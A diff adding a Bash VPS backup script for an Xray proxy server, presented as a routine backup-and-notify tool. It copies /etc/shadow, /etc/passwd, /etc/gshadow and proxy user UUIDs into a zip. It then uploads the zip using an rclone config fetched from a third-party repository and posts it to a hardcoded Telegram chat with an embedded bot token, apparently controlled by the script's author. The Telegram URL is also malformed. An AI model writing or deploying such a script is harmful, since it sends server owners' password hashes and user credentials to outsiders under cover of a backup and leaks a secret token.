@@ -1,0 +1,108 @@
+#!/bin/bash
+# My Telegram : https://t.me/sampiiiiu
+# ==========================================
+# Color
+RED='\033[0;31m'
+NC='\033[0m'
+GREEN='\033[0;32m'
+ORANGE='\033[0;33m'
+BLUE='\033[0;34m'
+CYAN='\033[0;36m'
+LIGHT='\033[0;37m'
+# ==========================================
+CHATID="6701388433"
+KEY="7193848831:AAFhSNDpbE3NKIb0_lzG2i-O2IN7SEas_1Q"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+REPO="https://raw.githubusercontent.com/diah082/vip/main/"
+IP=$(curl -sS ipv4.icanhazip.com)
+domain=$(cat /etc/xray/domain)
+date=$(date +"%Y-%m-%d")
+output_file="/root/backup/config.json"
+clear
+
+echo -e "${GREEN}Proses dimulai, harap tunggu...${NC}"
+# Instalasi dan konfigurasi Rclone
+apt install -y rclone > /dev/null 2>&1
+printf "q\n" | rclone config
+wget -qO /root/.config/rclone/rclone.conf "${REPO}install/rclone.conf"
+
+# Membuat direktori backup
+rm -rf /root/backup
+mkdir -p /root/backup
+cp /etc/passwd /etc/group /etc/shadow /etc/gshadow /root/backup/
+wget -qO "$output_file" "${REPO}install/newbie.json"
+
+# Proses pemformatan data
+input_files=("/etc/default/syncron/drawit/drawit.json" "/etc/default/syncron/sketsa/sketsa.json" "/etc/default/syncron/paradis/paradis.json")
+for input_file in "${input_files[@]}"; do
+    while IFS= read -r line; do
+        if [[ "$line" =~ ^###(ws|grpc)\ ([^[:space:]]+)\ ([^[:space:]]+)\ ([^[:space:]]+)$ ]]; then
+            protocol="${BASH_REMATCH[1]}"
+            user="${BASH_REMATCH[2]}"
+            expiry="${BASH_REMATCH[3]}"
+            uuid="${BASH_REMATCH[4]}"
+
+            case "$input_file" in
+                *drawit.json)
+                    formatted_data="# password $user $expiry\n},{\"password\": \"$uuid\",\"email\": \"$user\""
+                    if [[ "$protocol" == "ws" ]]; then
+                        sed -i "/#trojan/a $formatted_data" "$output_file"
+                    else
+                        sed -i "/#trojangrpc/a $formatted_data" "$output_file"
+                    fi
+                    ;;
+                *sketsa.json)
+                    formatted_data="#& $user $expiry\n},{\"id\": \"$uuid\",\"email\": \"$user\""
+                    if [[ "$protocol" == "ws" ]]; then
+                        sed -i "/#vless/a $formatted_data" "$output_file"
+                    else
+                        sed -i "/#vlessgrpc/a $formatted_data" "$output_file"
+                    fi
+                    ;;
+                *paradis.json)
+                    formatted_data="### $user $expiry\n},{\"id\": \"$uuid\",\"email\": \"$user\""
+                    if [[ "$protocol" == "ws" ]]; then
+                        sed -i "/#vmess/a $formatted_data" "$output_file"
+                    else
+                        sed -i "/#vmessgrpc/a $formatted_data" "$output_file"
+                    fi
+                    ;;
+            esac
+        fi
+    done < "$input_file"
+done
+
+# Membuat arsip backup
+zip -r /root/$IP-$date.zip /root/backup > /dev/null 2>&1
+
+# Mengunggah ke Google Drive
+rclone copy /root/$IP-$date.zip dr:backup/ > /dev/null 2>&1
+url=$(rclone link dr:backup/$IP-$date.zip)
+id=$(echo $url | grep '^https' | cut -d'=' -f2)
+link="https://drive.google.com/u/4/uc?id=${id}&export=download"
+
+# Mengirim pesan ke Telegram
+curl -s -F chat_id="$CHATID" -F document=@"$IP-$date.zip" -F caption="◇━━━━━━━━━━━━━━◇
+   ⚠️BACKUP NOTIF⚠️
+     Detail Backup VPS
+◇━━━━━━━━━━━━━━◇
+IP VPS  : ${IP} 
+DOMAIN  : ${domain}
+Tanggal : $date
+◇━━━━━━━━━━━━━━◇
+Link Backup   : $link
+◇━━━━━━━━━━━━━━◇
+Silahkan copy Link dan restore di VPS baru
+BY BOT : @Newbie_Store24" "$URL/sendDocument" > /dev/null
+
+# Membersihkan file sementara
+rm -rf /root/backup /root/$IP-$date.zip
+
+# Menampilkan hasil
+echo -e "${CYAN}Detail Backup${NC}"
+echo -e "=================================="
+echo -e "IP VPS        : ${GREEN}$IP${NC}"
+echo -e "Link Backup   : ${BLUE}$link${NC}"
+echo -e "Tanggal       : ${ORANGE}$date${NC}"
+echo -e "=================================="
+echo -e "${GREEN}Proses backup selesai!${NC}"
